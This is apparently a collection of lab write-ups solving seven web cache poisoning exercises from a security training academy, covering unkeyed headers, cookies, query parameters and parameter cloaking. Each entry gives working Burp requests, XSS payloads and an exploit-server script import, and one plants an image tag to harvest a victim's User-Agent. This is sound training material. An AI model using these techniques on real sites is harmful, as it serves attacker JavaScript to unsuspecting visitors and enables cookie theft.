### [PS-CACHE-01] Web cache poisoning with an unkeyed header

**Scenario:** The target application relies on an unkeyed HTTP header (`X-Forwarded-Host`) to dynamically construct script import URLs on the homepage, enabling an attacker to poison the HTTP cache and serve malicious JavaScript to visitors.

**Solution:**

1. Intercept `GET /` in Burp Repeater and test for unkeyed header behavior by adding:
```http
X-Forwarded-Host: exploit-server.net

```


2. Send the request and verify in the response body that the imported script source reflects the header value:
```html
<script src="//exploit-server.net/resources/js/tracking.js"></script>

```


3. Navigate to the Exploit Server and create a file at path `/resources/js/tracking.js` with the body:
```javascript
alert(document.cookie);

```


4. Return to Burp Repeater and send the request with `X-Forwarded-Host: exploit-server.net` repeatedly until the response header contains `X-Cache: hit`.
5. Visit the application homepage in a clean browser window to confirm execution of the cached XSS payload.

> **Key Takeaway:** Unkeyed headers that influence dynamic content generation allow attackers to rewrite response logic. Once cached, the poisoned response is served to all users sharing that cache key.

---

### [PS-CACHE-02] Web cache poisoning with an unkeyed cookie

**Scenario:** The target application reflects an unkeyed cookie value (`fehost`) directly inside an inline JavaScript object on the homepage without proper escaping, allowing cache poisoning that executes arbitrary JavaScript in visitors' browsers.

**Solution:**

1. Intercept `GET /` in Burp Repeater and append a cache buster parameter (`GET /?cb=123`) to isolate your testing.
2. Locate the `fehost` cookie in the request and observe its reflection in the response body inside a JavaScript variable:
```javascript
var tracking = { "fehost": "fehost-value" };

```


3. Modify the cookie value to break out of the string literal using binary subtraction operators (`-`) to construct a valid JS expression:
```http
Cookie: fehost=someString"-alert(1)-"someString

```


4. Send the request repeatedly in Repeater until the response returns a cache hit header (`X-Cache: hit`).
5. Remove the cache buster (`/?cb=123`) from the request line and send the payload again to poison the primary homepage cache (`GET /`).

> **Key Takeaway:** When cookies are unkeyed by front-end proxy cache rules and reflected into client-side script contexts, using arithmetic operators (`-` or `+`) allows breaking out of string literals within JS objects without causing syntax errors.

---

### [PS-CACHE-03] Web cache poisoning with multiple headers

**Scenario:** The target application requires a combination of two unkeyed headers (`X-Forwarded-Scheme` and `X-Forwarded-Host`) to trigger dynamic redirect logic, allowing an attacker to poison the cache and redirect legitimate users to a malicious JavaScript payload hosted on an external server.

**Solution:**

1. Intercept `GET /` in Burp Repeater and add a cache buster parameter (`GET /?cb=123`).
2. Add `X-Forwarded-Scheme: http` to the request; observe that the server triggers a `301 Moved Permanently` redirect to `https://` using the host provided in `X-Forwarded-Host`.
3. Host a malicious script on your Exploit Server at `/resources/js/tracking.js` containing:
```javascript
alert(document.cookie);

```


4. Combine both unkeyed headers in your Repeater request:
```http
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-server.net

```


5. Send the request repeatedly until the response header shows `X-Cache: hit`.
6. Remove the cache buster (`/?cb=123`) and send the request once more to poison the primary homepage cache (`GET /`).

> **Key Takeaway:** Some cache poisoning vulnerabilities require header chaining, where one unkeyed header acts as a control flag (e.g., forcing HTTP-to-HTTPS redirect logic) that triggers the processing of a second unkeyed header.

---

### [PS-CACHE-04] Targeted web cache poisoning using an unkeyed header

**Scenario:** The target application uses an unkeyed header (`X-Host`) to construct dynamic script import URLs and varies cache entries based on the `User-Agent` header, requiring the attacker to harvest the victim's exact `User-Agent` string to deliver a targeted payload.

**Solution:**

1. Intercept `GET /` in Burp Repeater and use Param Miner (or manual testing) to discover the unkeyed header `X-Host`.
2. Submit a comment on a blog post containing an HTML image tag pointing to your Exploit Server to force the administrative victim's browser to visit your server:
```html
<img src="https://exploit-server.net/log" />

```


3. Check the Exploit Server **Access Logs** and copy the victim's exact `User-Agent` string.
4. On the Exploit Server, create a file at `/resources/js/tracking.js` containing the payload:
```javascript
alert(document.cookie);

```


5. In Burp Repeater, craft a request to `GET /` replacing the `User-Agent` header with the victim's string and adding the `X-Host` header:
```http
Host: target.web-security-academy.net
User-Agent: <VICTIM_EXACT_USER_AGENT>
X-Host: exploit-server.net

```


6. Send the request repeatedly until `X-Cache: hit` is returned, ensuring the poisoned cache entry is reserved specifically for the victim's browser profile.

> **Key Takeaway:** When an application varies responses using `Vary: User-Agent`, cache poisoning must be selectively targeted by obtaining and matching the victim's exact HTTP `User-Agent` string.

---

### [PS-CACHE-05] Web cache poisoning using an unkeyed query string

**Scenario:** The front-end cache server is configured to exclude query parameters (such as analytics parameters) from the cache key, while the back-end origin server reflects unescaped parameter values into canonical link tags.

**Solution:**

1. Intercept `GET /` in Burp Repeater and append an analytics parameter (e.g., `GET /?utm_content=123`).
2. Send the request and observe that subsequent requests to `GET /?utm_content=456` still return `X-Cache: hit` under the root `GET /` cache key, confirming the parameter is unkeyed.
3. Observe that the parameter value is reflected unsanitized in the response inside a canonical link tag:
```html
<link rel="canonical" href="https://target.web-security-academy.net/?utm_content=123"/>

```


4. Craft an XSS payload breaking out of the HTML tag attribute:
```http
GET /?utm_content=123'/><script>alert(1)</script> HTTP/1.1

```


5. Send the payload request repeatedly until the response header shows `X-Cache: hit`.
6. Visit the target homepage (`GET /`) in a clean browser window to confirm the poisoned response is served to organic traffic without requiring query parameters.

> **Key Takeaway:** Excluding query parameters (like UTM analytics tags) from cache keys allows attackers to inject reflection payloads that poison the base URL path for all legitimate users.

---

### [PS-CACHE-06] Web cache poisoning via an unkeyed query parameter

**Scenario:** The cache server is configured to strip specific tracking/analytics parameters (such as `utm_content`) from the cache key, while the origin server still processes and reflects the parameter's value into the response, enabling an attacker to poison the cache for legitimate users.

**Solution:**

1. Intercept `GET /` in Burp Repeater and run Param Miner (`Guess parameters` $\rightarrow$ `Guess GET parameters`) to identify unkeyed query parameters.
2. Verify `utm_content` is unkeyed by sending `GET /?utm_content=test1` followed by `GET /?utm_content=test2`, observing that the second request returns `X-Cache: hit`.
3. Locate where `utm_content` is reflected in the response body (e.g., inside a dynamic script import or link tag):
```html
<script src='/resources/js/tracking.js?utm_content=test1'></script>

```


4. Craft an XSS payload breaking out of the attribute context:
```http
GET /?utm_content=test'/><script>alert(1)</script> HTTP/1.1

```


5. Send the request repeatedly until the response header shows `X-Cache: hit`.
6. Visit the homepage (`GET /`) in a clean tab without query parameters to verify that the unkeyed parameter payload has poisoned the main route.

> **Key Takeaway:** Stripping analytics parameters (like `utm_content`) from the cache key creates an unkeyed injection vector if the origin server processes or reflects those parameters anywhere in the HTTP response.

---

### [PS-CACHE-07] Parameter cloaking

**Scenario:** The front-end cache excludes specific analytics parameters (`utm_content`) from the cache key and treats semicolons (`;`) as part of parameter values. Meanwhile, the back-end framework uses semicolons as parameter delimiters, allowing an attacker to hide a secondary `callback` parameter inside an unkeyed parameter to poison a globally imported JavaScript file.

**Solution:**

1. Intercept `GET /js/geolocate.js?callback=setCountryCookie` in Burp Repeater.
2. Verify that adding `utm_content=foo` is excluded from the cache key, allowing requests to return `X-Cache: hit`.
3. Append a second `callback` parameter onto `utm_content` using a semicolon (`;`) as a delimiter:
```http
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1) HTTP/1.1

```


4. Observe that the front-end cache treats `utm_content=foo;callback=alert(1)` as one long unkeyed string and keys the request under `callback=setCountryCookie`.
5. Observe that the back-end server parses the semicolon as a parameter separator and processes the second `callback` parameter, returning `alert(1)` in the script execution:
```javascript
alert(1)({"country": "United Kingdom"})

```


6. Send the request repeatedly until `X-Cache: hit` is returned to poison `/js/geolocate.js?callback=setCountryCookie` for all site visitors.

> **Key Takeaway:** Parameter cloaking relies on parsing discrepancies (e.g., `;` vs `&`) between the cache and origin server, allowing attackers to hide keyed parameters inside unkeyed parameters and trigger parameter pollution without altering the cache key.